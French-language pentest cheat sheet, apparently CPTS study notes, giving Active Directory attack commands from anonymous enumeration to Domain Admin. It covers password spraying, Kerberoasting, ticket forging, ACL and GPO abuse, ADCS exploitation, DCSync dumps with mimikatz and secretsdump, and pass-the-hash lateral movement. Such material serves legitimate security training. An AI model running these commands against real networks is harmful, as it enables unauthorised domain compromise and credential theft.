# 13 — Active Directory Enumeration & Attacks

## Objectifs
Énumérer un domaine AD sans credentials puis avec, attaquer Kerberos, abuser des ACL, compromettre ADCS, extraire les secrets (DCSync), se déplacer latéralement jusqu'au Domain Admin.

---

## 1. Recon sans credentials

```bash
# DNS du domaine
dig +short SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DC_IP>
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <DC_IP>

# SMB / null session
netexec smb <DC_IP>
netexec smb <DC_IP> -u '' -p '' --shares
enum4linux-ng -A <DC_IP>
rpcclient -U '' -N <DC_IP>
# rpcclient> enumdomusers / querydominfo / getdompwinfo

# LDAP anonyme
ldapsearch -H ldap://<DC_IP> -x -s base -b "" "(objectClass=*)"
ldapsearch -H ldap://<DC_IP> -x -b "dc=<DOMAIN>,dc=htb" "(objectClass=*)"

# Nom d'utilisateur valide (Kerberos)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
# ou
./kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt -o valid.txt

# AS-REP roasting (comptes sans pré-auth)
impacket-GetNPUsers <DOMAIN>/ -usersfile valid.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
netexec ldap <DC_IP> -u valid.txt -p '' --asreproast asrep.txt
```

### Password spraying (sans creds)
```bash
netexec smb <DC_IP> -u valid.txt -p 'Welcome1' --continue-on-success
# ou avec un compte valide
netexec smb <DC_IP> -u users.txt -p 'Password123' -d <DOMAIN> --continue-on-success
```

---

## 2. Énumération avec credentials

```bash
# NetExec — la base
netexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --users --groups --shares --pass-pol --sessions --loggedon-users
netexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --rid-brute
netexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --users --groups --trusted-for-delegation
netexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --bloodhound --collection All

# BloodHound (collecte)
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All
# Importer les .json dans BloodHound → requêtes "Shortest path to Domain Admins"

# PowerView (Windows)
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser -Properties samaccountname,description,memberof
Get-DomainGroup -Identity "Domain Admins" -Members
Get-DomainComputer -Properties dnshostname,operatingsystem
Get-DomainGPO
Get-DomainTrust
Find-LocalAdminAccess
Invoke-ShareFinder
```

### Impacket / LDAP
```bash
impacket-GetADUsers <DOMAIN>/<USER>:<PASS> -all -dc-ip <DC_IP>
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
ldapsearch -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w <PASS> -b "dc=<DOMAIN>,dc=htb" "(objectClass=user)" sAMAccountName description
```

---

## 3. Kerberos

### AS-REP Roasting
```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt <WORDLIST>
```

### Kerberoasting
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerb.txt
netexec ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
```

### Golden / Silver Ticket
```bash
# Golden (krbtgt hash nécessaire)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>

# Silver (hash du compte de service)
impacket-ticketer -nthash <SVC_HASH> -domain-sid <SID> -domain <DOMAIN> -spn cifs/<TARGET> <USER>
```

### S4U / Delegation abuse
```bash
# Contrainte (S4U2Self/Proxy)
impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/<SVC>:<PASS> -dc-ip <DC_IP>
export KRB5CCNAME=Administrator.ccache

# RBCD (Resource-Based Constrained Delegation)
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'EVIL$' -computer-pass 'Pass123' -dc-ip <DC_IP>
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write <DOMAIN>/<USER>:<PASS>
impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/'EVIL$':'Pass123'
```

---

## 4. ACL abuse

```bash
# Lecture des ACL
impacket-dacledit -action read -target <TARGET_USER> -principal <USER> <DOMAIN>/<USER>:<PASS>
netexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --find-delegation

# GenericAll / GenericWrite sur un utilisateur → reset password
net rpc password <TARGET_USER> -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>
# ou
impacket-smbpasswd ...

# ForceChangePassword
rpcclient -U '<DOMAIN>/<USER>%<PASS>' <DC_IP>
# setuserinfo2 <TARGET_USER> 23 'NewPass123!'

# WriteDACL → s'octroyer DCSync
impacket-dacledit -action write -rights DCSync -principal <USER> -target-dn "DC=<DOMAIN>,DC=htb" <DOMAIN>/<USER>:<PASS>

# GenericWrite sur un ordinateur → RBCD
# WriteOwner → prendre possession puis WriteDACL

# Outils Windows
.\SharpHound.exe -c All
.\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights DCSync
```

### GPO abuse
```bash
# Droits sur une GPO → exécution sur les machines du OU
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author <DOMAIN>\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators <USER> /add" --GPOName "Default Domain Policy"
```

---

## 5. ADCS (certificats)

```bash
# Énumération
certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout
# Chercher ESC1..ESC8

# ESC1 : template avec ENROLLEE_SUPPLIES_SUBJECT + client auth
certipy-ad req -u <USER>@<DOMAIN> -p <PASS> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN> -dc-ip <DC_IP>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>

# ESC8 : relais HTTP vers ADCS
certipy-ad relay -target http://<CA_HOST>/certsrv/certfnsh.asp -template DomainController
# + PetitPotam / printerbug pour forcer l'auth du DC

# Récupération du hash du compte machine
certipy-ad auth -pfx <DC>.pfx -dc-ip <DC_IP>
```

---

## 6. DCSync & secrets

```bash
# Nécessite les droits de réplication (DA / DCSync délégué)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

# NetExec
netexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --ntds
```

### Après DCSync
```bash
# Pass-the-Hash Domain Admin
impacket-psexec -hashes :<DA_NTHASH> <DOMAIN>/Administrator@<DC_IP>
netexec smb <DC_IP> -u Administrator -H <DA_NTHASH> -d <DOMAIN> -x whoami

# Golden ticket avec le hash krbtgt
```

---

## 7. Mouvement latéral

```bash
# PsExec / WMI / SMB
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET> 'whoami'
netexec smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN> -x 'whoami'

# WinRM
evil-winrm -i <TARGET> -u <USER> -p <PASS>
netexec winrm <TARGET> -u <USER> -p <PASS> -d <DOMAIN>

# RDP
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /d:<DOMAIN>

# Pass-the-Hash
impacket-wmiexec -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# Overpass-the-Hash (AES / RC4)
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH>
export KRB5CCNAME=<USER>.ccache
```

---

## 8. Trusts & forêts

```bash
# Énumérer les trusts
impacket-GetADTrusts ... / netexec ldap --trusted-for-delegation
Get-DomainTrust -Domain <DOMAIN>
nltest /domain_trusts /all_trusts

# SID history
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Golden ticket inter-domaines (SID extra)
impacket-ticketer -nthash <KRBTGT> -domain-sid <CHILD_SID> -domain <CHILD> -extra-sid <PARENT_SID>-519 Administrator
```

---

## 9. Stratégie d'attaque type CPTS

1. **Recon** : ports AD, DNS, null session, kerbrute.
2. **Creds initiaux** : spray, AS-REP, phishing (si autorisé), web app.
3. **Enum** : BloodHound → chemins les plus courts vers DA.
4. **Escalade** : ACL, Kerberoast, ADCS, délégation.
5. **DA** : DCSync, Golden Ticket.
6. **Objectif** : preuve d'accès (flag, capture), rapport.

### Commandes BloodHound clés (interface)
```
Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Find All Kerberoastable Accounts
Find AS-REP Roastable Users
Shortest Paths from Owned Principals
Find Computers where Domain Users are Local Admin
```

---

## Checklist
- [ ] Domaine / DC identifiés
- [ ] Utilisateurs valides énumérés
- [ ] AS-REP et Kerberoast tentés
- [ ] BloodHound collecté et analysé
- [ ] ACL / délégations / ADCS vérifiés
- [ ] Credentials réutilisés (spray, PtH)
- [ ] DCSync / DA atteint
- [ ] Preuves et chemins documentés
